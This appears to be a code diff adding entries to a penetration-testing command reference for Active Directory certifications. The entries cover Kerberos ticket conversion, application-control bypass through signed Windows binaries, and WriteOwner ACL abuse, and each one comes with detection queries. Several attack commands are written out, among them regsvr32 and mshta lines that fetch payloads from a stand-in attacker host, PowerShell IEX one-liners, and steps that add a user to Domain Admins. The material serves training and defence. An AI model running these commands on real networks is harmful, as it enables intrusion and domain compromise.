+        {
+          "id": "crtp-golden-ticket",
+          "note": "Golden Tickets can include extra SIDs for cross-domain access.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The SIDHistory attribute is included in the Kerberos PAC without further validation by the parent domain. A child domain DA can inject any SID, and the parent domain trusts it.",
+        "prerequisites": "Domain Admin on the child domain; knowledge of the parent domain SID.",
+        "impact": "Persistent cross-domain privilege escalation; effectively Enterprise Admin without group membership.",
+        "detection": "[MITRE T1134.005] Event 4765/4766 (SID History added); accounts with SIDHistory containing privileged SIDs.",
+        "artifacts": "Event 4765 (SID History added to account); SIDHistory attribute on user objects; unusual cross-domain access patterns.",
+        "splunk_spl": "index=windows EventCode IN (4765, 4766)\n| table _time, TargetUserName, SidHistory, SubjectUserName",
+        "elastic_kql": "event.code:(\"4765\" OR \"4766\")",
+        "sentinel_kql": "SecurityEvent\n| where EventID in (4765, 4766)\n| project TimeGenerated, TargetUserName, SubjectUserName, SidHistory",
+        "sigma_rules": "win_security_sid_history_injection",
+        "prevention": "Enable SID Filtering on trusts; monitor SIDHistory attribute changes; audit Event 4765/4766; restrict Domain Admin usage.",
+        "sources": [
+          "CRTP cross-domain module",
+          "https://attack.mitre.org/techniques/T1134/005/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "SID History injection on user account",
+            "logic": "SecurityEvent\n| where EventID in (4765, 4766)\n| project TimeGenerated, TargetUserName, SubjectUserName, SidHistory\n| extend InjectedSID = tostring(SidHistory)",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4765",
+              "4766"
+            ],
+            "attack": [
+              "T1134.005"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Legitimate domain migrations using ADMT",
+            "tuning": "Any SID History modification outside of planned migrations should trigger an alert"
+          }
+        ]
+      }
     },
     {
       "id": "cdsa-m12-sigma-rules",
@@ -157770,6 +158866,85 @@ const COMMAND_DATA = {
       "explain": "Structured threat hunting methodology used in SOC environments.\nThreat hunting is a proactive, human-led practice that searches for advanced threats evading automated detection.\n=== Threat Hunting Definition ===\nProactive, human-led practice that systematically searches for stealthy advanced threats\nevading existing security solutions. Goal: reduce dwell time by detecting ..."
     },
     {
+      "id": "ad-ticketconverter",
+      "name": "ticketConverter.py - Kerberos Ticket Format Conversion",
+      "command": "python3 ticketConverter.py <input_ticket>.kirbi <output_ticket>.ccache",
+      "description": "Impackets ticketConverter converts Kerberos tickets between formats: kirbi (Windows/Mimikatz/Rubeus format) to ccache (Linux/Impacket format) and vice versa. Essential for cross-platform attack chains where you extract a ticket on Windows and need to use it on Linux, or vice versa.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "silent",
+      "category": "Active Directory",
+      "subcategory": "Lateral Movement",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "Impacket/ticketConverter.py; cross-platform AD attacks",
+      "tags": [
+        "ticketconverter",
+        "impacket",
+        "kirbi",
+        "ccache",
+        "kerberos",
+        "ticket-conversion",
+        "cross-platform"
+      ],
+      "mitre": [
+        "T1550.003"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== KIRBI TO CCACHE (Windows -> Linux) ===\n  python3 ticketConverter.py admin.kirbi admin.ccache\n  export KRB5CCNAME=admin.ccache\n  python3 psexec.py -k -no-pass <domain>/administrator@<target>\n\n=== CCACHE TO KIRBI (Linux -> Windows) ===\n  python3 ticketConverter.py admin.ccache admin.kirbi\n  # Import on Windows with Rubeus:\n  Rubeus.exe ptt /ticket:<base64_of_kirbi>\n\n=== COMMON WORKFLOW ===\n  # 1. Extract ticket on Windows (Rubeus)\n  Rubeus.exe dump /nowrap\n  # Save base64 to file, decode:\n  base64 -d ticket.b64 > ticket.kirbi\n\n  # 2. Convert to ccache\n  python3 ticketConverter.py ticket.kirbi ticket.ccache\n\n  # 3. Use on Linux\n  export KRB5CCNAME=ticket.ccache\n  python3 secretsdump.py -k -no-pass <dc_fqdn>\n\n=== DECODE BASE64 TICKET ===\n  # From Rubeus output (base64 encoded kirbi):\n  echo \"<base64_ticket>\" | base64 -d > ticket.kirbi\n  # Then convert:\n  python3 ticketConverter.py ticket.kirbi ticket.ccache",
+      "examples": [
+        {
+          "label": "Convert kirbi to ccache",
+          "command": "python3 ticketConverter.py admin.kirbi admin.ccache"
+        },
+        {
+          "label": "Convert ccache to kirbi",
+          "command": "python3 ticketConverter.py admin.ccache admin.kirbi"
+        },
+        {
+          "label": "Full cross-platform workflow",
+          "command": "echo \"<base64_ticket>\" | base64 -d > ticket.kirbi && python3 ticketConverter.py ticket.kirbi ticket.ccache && export KRB5CCNAME=ticket.ccache"
+        }
+      ],
+      "references": [
+        {
+          "title": "Impacket - ticketConverter.py",
+          "url": "https://github.com/fortra/impacket"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "rubeus-ptt",
+          "note": "Rubeus extracts tickets on Windows; ticketConverter moves them to Linux.",
+          "rel": "prereq"
+        },
+        {
+          "id": "ptt-linux",
+          "note": "Use converted ccache tickets with Impacket tools on Linux.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Kerberos tickets are protocol-level tokens that are valid regardless of the platform they are used from. Converting between formats allows attackers to leverage tickets extracted on one OS from another.",
+        "prerequisites": "A valid Kerberos ticket in either kirbi or ccache format.",
+        "impact": "Cross-platform ticket reuse; enables using Windows-extracted tickets from Linux attack tools.",
+        "detection": "[MITRE T1550.003] Ticket use from unexpected platforms; Kerberos authentication from non-Windows clients for Windows services.",
+        "artifacts": "Event 4769 (TGS request) from Linux IP addresses; unusual client OS in Kerberos authentication.",
+        "splunk_spl": "index=windows EventCode=4769\n| where NOT match(IpAddress, \"10\\.10\\.\") AND IpAddress!=\"127.0.0.1\"\n| table _time, TargetUserName, ServiceName, IpAddress",
+        "elastic_kql": "event.code:\"4769\" AND source.ip:*",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4769\n| project TimeGenerated, TargetUserName, ServiceName, IpAddress, TicketEncryptionType",
+        "sigma_rules": "win_security_kerberos_ticket_cross_platform",
+        "prevention": "Monitor for Kerberos authentication from unexpected source IPs; use Protected Users group; implement PAC validation.",
+        "sources": [
+          "Impacket documentation",
+          "https://attack.mitre.org/techniques/T1550/003/"
+        ]
+      }
+    },
+    {
       "id": "ad-ticketer-extrasids",
       "name": "ticketer.py - Forge ExtraSids Golden Ticket (Child→Parent)",
       "command": "ticketer.py -nthash <child_krbtgt_hash> -domain <child_domain> -domain-sid <child_sid> -extra-sid <parent_EA_sid> Administrator",
@@ -165493,6 +166668,106 @@ const COMMAND_DATA = {
         "web"
       ],
       "explain": "Detects and fingerprints a Web Application Firewall by probing it and analysing responses:\n  wafw00f <url>   send crafted requests to the target and match the WAF signature\nTells you the WAF vendor so you can pick the right evasion technique before attacking; add -a to test all signatures and -v for detail."
+    },
+    {
+      "id": "ad-wdac-bypass",
+      "name": "WDAC/AppLocker Bypass - Application Control Evasion",
+      "command": "MSBuild.exe payload.xml",
+      "description": "Windows Defender Application Control (WDAC) and AppLocker restrict which executables can run. Bypasses abuse trusted Microsoft-signed binaries (LOLBins) that can execute arbitrary code: MSBuild.exe (XML payloads), InstallUtil.exe (.NET assemblies), Regsvr32.exe (scriptlets), MSHTA.exe (HTA files), and more. These binaries are allowed by default in most policies.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Post-Exploitation",
+      "subcategory": "Defense Evasion",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "CRTP evasion module; LOLBAS project",
+      "tags": [
+        "wdac",
+        "applocker",
+        "bypass",
+        "lolbin",
+        "msbuild",
+        "installutil",
+        "application-control",
+        "evasion"
+      ],
+      "mitre": [
+        "T1127.001",
+        "T1218"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== MSBUILD.EXE (most reliable) ===\n  # Create payload.xml with inline C# task:\n  # (Contains shellcode runner or reverse shell)\n  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.xml\n\n=== INSTALLUTIL.EXE ===\n  # Compile .NET assembly with [System.ComponentModel.RunInstaller(true)]\n  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll\n\n=== REGSVR32.EXE (scriptlet) ===\n  regsvr32 /s /n /u /i:http://<attacker>/payload.sct scrobj.dll\n\n=== MSHTA.EXE ===\n  mshta http://<attacker>/payload.hta\n  mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass -c IEX(...)\"\":close\")\n\n=== RUNDLL32.EXE ===\n  rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -ep bypass -c IEX(...)\")\n\n=== CMSTP.EXE ===\n  cmstp.exe /ni /s payload.inf\n\n=== WDAC vs APPLOCKER ===\n  AppLocker: User-mode only, easier to bypass\n  WDAC: Kernel-enforced, harder but still bypassable via LOLBins\n  Both trust Microsoft-signed binaries by default\n\n=== LOLBAS PROJECT ===\n  Full list of Living Off The Land Binaries:\n  https://lolbas-project.github.io/",
+      "examples": [
+        {
+          "label": "MSBuild.exe bypass",
+          "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.xml"
+        },
+        {
+          "label": "InstallUtil.exe bypass",
+          "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll"
+        },
+        {
+          "label": "Regsvr32 scriptlet bypass",
+          "command": "regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll"
+        }
+      ],
+      "references": [
+        {
+          "title": "LOLBAS Project",
+          "url": "https://lolbas-project.github.io/"
+        },
+        {
+          "title": "MITRE T1127.001 - MSBuild",
+          "url": "https://attack.mitre.org/techniques/T1127/001/"
+        },
+        {
+          "title": "MITRE T1218 - System Binary Proxy Execution",
+          "url": "https://attack.mitre.org/techniques/T1218/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ps-downgrade-attack",
+          "note": "PowerShell downgrade bypasses AMSI; LOLBins bypass AppLocker/WDAC.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Microsoft-signed binaries (MSBuild, InstallUtil, etc.) are trusted by default in WDAC/AppLocker policies. These binaries have legitimate functionality that can be abused to execute arbitrary code.",
+        "prerequisites": "Access to execute LOLBins on the target (usually available by default).",
+        "impact": "Execution of arbitrary code despite application control policies; defense evasion.",
+        "detection": "[MITRE T1218] Process creation of LOLBins with unusual arguments; MSBuild/InstallUtil loading suspicious XML/DLL files.",
+        "artifacts": "Sysmon Event 1 for MSBuild/InstallUtil with unusual command lines; .NET assembly loading events; network connections from LOLBins.",
+        "splunk_spl": "index=sysmon EventCode=1 (Image=\"*MSBuild.exe\" OR Image=\"*InstallUtil.exe\" OR Image=\"*regsvr32.exe\" OR Image=\"*mshta.exe\" OR Image=\"*cmstp.exe\")\n| where NOT match(ParentImage, \"(?i)devenv|visual studio\")\n| table _time, User, Image, CommandLine, ParentImage",
+        "elastic_kql": "process.name:(\"MSBuild.exe\" OR \"InstallUtil.exe\" OR \"regsvr32.exe\" OR \"mshta.exe\" OR \"cmstp.exe\")",
+        "sentinel_kql": "DeviceProcessEvents\n| where FileName in~ (\"MSBuild.exe\", \"InstallUtil.exe\", \"regsvr32.exe\", \"mshta.exe\", \"cmstp.exe\")\n| where InitiatingProcessFileName !in~ (\"devenv.exe\", \"explorer.exe\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+        "sigma_rules": "proc_creation_win_lolbin_execution",
+        "prevention": "Block LOLBins via WDAC managed installer rules; use strict allowlisting; monitor LOLBin execution with Sysmon; implement ASR rules for Office/script blocking.",
+        "sources": [
+          "CRTP evasion module",
+          "https://attack.mitre.org/techniques/T1218/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "LOLBin execution for application control bypass",
+            "logic": "DeviceProcessEvents\n| where FileName in~ (\"MSBuild.exe\", \"InstallUtil.exe\", \"regsvr32.exe\", \"mshta.exe\", \"cmstp.exe\", \"rundll32.exe\")\n| where ProcessCommandLine has_any (\".xml\", \".sct\", \"/U\", \"/i:http\", \"javascript:\", \"vbscript:\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1127.001",
+              "T1218"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate MSBuild for .NET compilation; InstallUtil for service installation",
+            "tuning": "Whitelist developer workstations for MSBuild; alert on any LOLBin with network or script arguments"
+          }
+        ]
+      }
     },
     {
       "type": "command",
@@ -178180,6 +179455,105 @@ const COMMAND_DATA = {
       "explain": "Abuses WriteDACL over the domain object to grant yourself DCSync rights, then dump hashes:\n  --host <dc_ip>            the Domain Controller\n  -d <domain>              the domain\n  -u <user> -p <password>  authenticate as the account holding WriteDACL\n  add dcsync <user>        write the DS-Replication-Get-Changes(-All) ACEs onto <user>\nWith replication rights, run secretsdump.py to DCSync the domain (krbtgt, Administrator, all NT hashes); remove the ACE afterward to clean up."
     },
     {
+      "id": "ad-writeowner-abuse",
+      "name": "WriteOwner Abuse - Take Ownership & Full Control",
+      "command": "Set-DomainObjectOwner -Identity <target_object> -OwnerIdentity <attacker_user>",
+      "description": "WriteOwner permission allows changing the owner of an AD object. Once you own an object, you can grant yourself GenericAll (full control) over it, then exploit any of the GenericAll abuse paths. This is a two-step escalation: take ownership, then grant permissions, then abuse.",
+      "platform": "windows",
+      "type": "attack-chain",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "ACL Abuse",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "CRTP ACL abuse module; BloodHound documentation",
+      "tags": [
+        "writeowner",
+        "acl-abuse",
+        "take-ownership",
+        "genericall",
+        "privilege-escalation"
+      ],
+      "mitre": [
+        "T1222.001"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== STEP 1: TAKE OWNERSHIP ===\n  # PowerView\n  Set-DomainObjectOwner -Identity \"Domain Admins\" -OwnerIdentity jdoe\n  # Or target a user:\n  Set-DomainObjectOwner -Identity svc_admin -OwnerIdentity jdoe\n\n=== STEP 2: GRANT FULL CONTROL ===\n  Add-DomainObjectAcl -TargetIdentity \"Domain Admins\" -PrincipalIdentity jdoe -Rights All\n  # Or specific right:\n  Add-DomainObjectAcl -TargetIdentity svc_admin -PrincipalIdentity jdoe -Rights ResetPassword\n\n=== STEP 3: ABUSE ===\n  # If target is a group - add yourself:\n  Add-DomainGroupMember -Identity \"Domain Admins\" -Members jdoe\n  # If target is a user - reset password:\n  Set-DomainUserPassword -Identity svc_admin -AccountPassword (ConvertTo-SecureString \"NewPass123!\" -AsPlainText -Force)\n  # Or use any GenericAll abuse path\n\n=== IMPACKET (LINUX) ===\n  # owneredit.py\n  python3 owneredit.py -action write -owner jdoe -target \"Domain Admins\" <domain>/<user>:<pass>\n  # dacledit.py\n  python3 dacledit.py -action write -rights FullControl -principal jdoe -target \"Domain Admins\" <domain>/<user>:<pass>",
+      "examples": [
+        {
+          "label": "Take ownership of Domain Admins group",
+          "command": "Set-DomainObjectOwner -Identity \"Domain Admins\" -OwnerIdentity jdoe"
+        },
+        {
+          "label": "Grant yourself full control",
+          "command": "Add-DomainObjectAcl -TargetIdentity \"Domain Admins\" -PrincipalIdentity jdoe -Rights All"
+        },
+        {
+          "label": "Linux - owneredit.py + dacledit.py",
+          "command": "python3 owneredit.py -action write -owner jdoe -target \"Domain Admins\" corp.local/jdoe:Password123"
+        }
+      ],
+      "references": [
+        {
+          "title": "BloodHound - WriteOwner Edge",
+          "url": "https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html"
+        },
+        {
+          "title": "MITRE T1222.001 - Windows File and Directory Permissions Modification",
+          "url": "https://attack.mitre.org/techniques/T1222/001/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-genericwrite-abuse",
+          "note": "After granting GenericWrite, use these abuse paths.",
+          "rel": "next"
+        },
+        {
+          "id": "ad-impacket-dacledit",
+          "note": "dacledit.py grants permissions from Linux after ownership change.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Object owners in AD have implicit permission to modify the DACL (access control list). Taking ownership is the prerequisite to granting yourself any permission on the object.",
+        "prerequisites": "WriteOwner permission on the target AD object.",
+        "impact": "Full control over the target object; if the target is a privileged group or user, leads to domain compromise.",
+        "detection": "[MITRE T1222.001] Event 4670 (permissions changed) and 5136 (owner changed) on sensitive objects.",
+        "artifacts": "Event 4670 (object ACL changed); Event 5136 showing owner attribute modification; subsequent 4728/4732 (group membership changes).",
+        "splunk_spl": "index=windows EventCode=5136 AttributeLDAPDisplayName=\"nTSecurityDescriptor\"\n| table _time, SubjectUserName, ObjectDN, AttributeValue\n| where match(ObjectDN, \"(?i)admin|domain admins|enterprise\")",
+        "elastic_kql": "event.code:\"5136\" AND winlog.event_data.AttributeLDAPDisplayName:\"nTSecurityDescriptor\"",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 5136\n| where AttributeLDAPDisplayName == \"nTSecurityDescriptor\"\n| where ObjectDN has_any (\"Domain Admins\", \"Enterprise Admins\", \"Administrators\")\n| project TimeGenerated, SubjectUserName, ObjectDN",
+        "sigma_rules": "win_security_writeowner_abuse_acl_change",
+        "prevention": "Audit WriteOwner permissions on sensitive objects; monitor ACL changes on privileged groups/users; implement AdminSDHolder protection.",
+        "sources": [
+          "CRTP ACL module",
+          "https://attack.mitre.org/techniques/T1222/001/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "WriteOwner abuse - ownership change on privileged object",
+            "logic": "SecurityEvent\n| where EventID == 5136\n| where AttributeLDAPDisplayName == \"nTSecurityDescriptor\"\n| where ObjectDN has_any (\"Domain Admins\", \"Enterprise Admins\", \"Schema Admins\", \"Administrators\", \"Account Operators\")\n| project TimeGenerated, SubjectUserName, ObjectDN, OperationType",
+            "data_source": "windows-security",
+            "log_ids": [
+              "5136"
+            ],
+            "attack": [
+              "T1222.001"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate ACL management by authorized administrators",
+            "tuning": "Alert on any ownership/ACL change on tier-0 objects; whitelist only authorized admin accounts"
+          }
+        ]
+      }
+    },
+    {
       "id": "pth-freerdp",
       "name": "xFreeRDP - Pass the Hash",
       "command": "xfreerdp /v:<ip> /u:<user> /pth:<nt_hash>",
@@ -182939,8 +184313,8 @@ const COMMAND_DATA = {
       }
     }
   ],
-  "totalCommands": 1006,
-  "buildDate": "2026-11-10T12:53:56.337Z",
+  "totalCommands": 1020,
+  "buildDate": "2026-11-10T13:49:07.775Z",
   "certifications": [
     "CDSA",
     "CPTS",
